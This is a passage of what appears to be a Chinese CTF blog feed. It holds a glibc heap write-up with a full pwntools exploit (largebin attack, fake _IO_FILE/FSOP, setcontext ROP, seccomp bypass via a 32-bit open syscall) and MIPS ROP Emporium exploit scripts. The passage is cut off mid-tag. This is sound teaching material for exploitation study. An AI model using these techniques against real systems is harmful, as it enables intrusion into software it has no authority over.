fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>，或者后者&#96;&#96;_IO_vtable_offset (fp) &#x3D;&#x3D; 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base&#96;即可</p><p>​</p><p>进入<code>_IO_wfile_overflow</code>后会有rdx直接赋值为<code>fp-&gt;_wide_data</code>，所以可以直接配合setcontext函数使用</p><img src="/img/6/Screenshot_20230103_095137.jpg" style="zoom: 67%;" /><p>​</p><p>题目中存在沙盒，64位和32的限制都有</p><img src="/img/6/Screenshot_20230103_103656.jpg" style="zoom: 67%;" /><p>但seccomp-tools将32位系统调用号也看成64位的，这就很迷惑人。对比32位的系统表就会发现open的系统调用在32位中的系统调用号为5，这里就先使用32位的open调用号去打开flag文件，再去用64位的读写。由于32位寄存器大小的限制，直接使用pwntools生成的open系统调用会出错，所以先mmap一段低地址内存再去使用。</p><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;store&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./store&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">throw</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>buy(<span class="hljs-number">0x420</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>buy(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak -<span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + <span class="hljs-built_in">hex</span>(libcbase))<br><br>buy1(<span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;heap_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))<br><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall_ret = libcbase + <span class="hljs-number">0x66229</span><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>magic_gadget = libcbase + <span class="hljs-number">0x154930</span><br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">1</span>)<br>buy1(<span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0x860</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;&#x27;</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                  <span class="hljs-comment">#_lock</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)   <span class="hljs-comment">#_wide_data</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_mode</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)         <span class="hljs-comment">#vtable</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_prt</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x138</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br><br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr - <span class="hljs-number">0x290</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.mmap(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x23000</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                          </p><p>​                                                                          </p><p>参考：<a href="https://blog.wm-team.cn/index.php/archives/34/">强网拟态 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Rop Emporinm(MIPS)几道题的wp</title>
    <link href="/2022/11/11/Rop-Emporinm(MIPS)/"/>
    <url>/2022/11/11/Rop-Emporinm(MIPS)/</url>
    
    <content type="html"><![CDATA[<p>与路由环境不同，这里所用到的是glibc，所以需要提前下载好相应的动态链接库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libc6-mipsel-cross<br></code></pre></td></tr></table></figure><p>​                       </p><p>MIPS动态库中的外部符号调用，是依赖<code>.got</code>段和<code>.MIPS.stubs</code>段来共同实现的，<code>.MIPS.stubs</code>类似于x86的<code>.plt</code>。</p><h4 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h4><p>直接找到函数ret2win地址去执行 system(“&#x2F;bin&#x2F;cat flag.txt”)，输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2win_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2win_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(<span class="hljs-number">0x400a00</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h4><p>利用system的地址和flag.txt字符串的地址，输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;split_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./split_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400a20</span><br><span class="hljs-comment">#sys_addr = 0x400b70</span><br>sys_addr = <span class="hljs-number">0x4009ec</span><br>cat_flag = <span class="hljs-number">0x411010</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(sys_addr) +p32(cat_flag)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h4><p>运行callme1，callme2，callme3函数，并传递正确的参数，在if语句中执行正确的分支，才会将flag输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;callme_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./callme_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>gadget = <span class="hljs-number">0x400bb0</span><br>callme_one = <span class="hljs-number">0x400d20</span><br>callme_two = <span class="hljs-number">0x400d80</span><br>callme_three = <span class="hljs-number">0x400d10</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_one) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_two) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_three) + p32(key3) + p32(key2) + p32(key1)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h4><p>通过执行print_file函数，将print_file函数参数flag.txt写到data段或者bss段上，可输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;write4_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&quot;write4_mipsel&quot;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400930</span><br>print_file = <span class="hljs-number">0x400a90</span><br>pwnme = <span class="hljs-number">0x400a70</span><br>buf = <span class="hljs-number">0x411000</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;flag&#x27;</span> + p32(buf) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;.txt&#x27;</span> + p32(buf + <span class="hljs-number">4</span>) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget + <span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(print_file) + p32(buf)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h4><p>与write4一样，通过执行print_file函数，将print_file函数参数flag.txt写到data段或者bss段上，可输出flag</p><p>但会对字符串判断，如果字符串中’有x’，’g’，’a’，’.’这些字符就会赋值为-21，可以通过xor加密绕过判断，</p><p>然后xor还原。和x86不同的是MIPS需要地址对齐才能正常取出字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;badchars_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./badchars_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400930</span><br>gadget2 = <span class="hljs-number">0x400948</span><br>gadget3 = <span class="hljs-number">0x400968</span><br>buf = <span class="hljs-number">0x411000</span><br><br>badchars = [<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>]<br>new_flag = <span class="hljs-string">&quot;&quot;</span><br>xor_byte = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    output = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>        c = <span class="hljs-built_in">ord</span>(i)  ^  xor_byte<br>        c =  <span class="hljs-built_in">chr</span>(c)<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> badchars:<br>            xor_byte += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            output += c<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">8</span>:<br>        new_flag = output<br>        <span class="hljs-keyword">break</span><br>new_flag = <span class="hljs-built_in">bytes</span>(new_flag.encode())<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + p32(<span class="hljs-number">0</span>) + new_flag[:<span class="hljs-number">4</span>] + p32(buf) + p32(gadget1)<br>payload += p32(<span class="hljs-number">0</span>) + new_flag[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>] + p32(buf + <span class="hljs-number">4</span>) + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf) + p32(xor_b)  + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_b)  + p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_byte &lt;&lt; <span class="hljs-number">24</span>)  + p32(gadget3) <br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x400ab0</span>) + p32(buf)<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h4><p>溢出后利用栈迁移修改foothold_function函数got表的地址为ret2win的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pivot_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./pivot_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400ca0</span><br>gadget2 = <span class="hljs-number">0x400cb0</span><br>gadget3 = <span class="hljs-number">0x400cc4</span><br>gadget4 = <span class="hljs-number">0x400cd0</span><br><br>foothold = <span class="hljs-number">0x400e60</span><br>foothold_got = <span class="hljs-number">0x412060</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>pivot_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><br>payload1 = p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(foothold)<br>payload1 += p32(<span class="hljs-number">0</span>) + p32(foothold_got) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(gadget3)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">32</span> + p32(pivot_addr) + p32(gadget4)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload2)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" 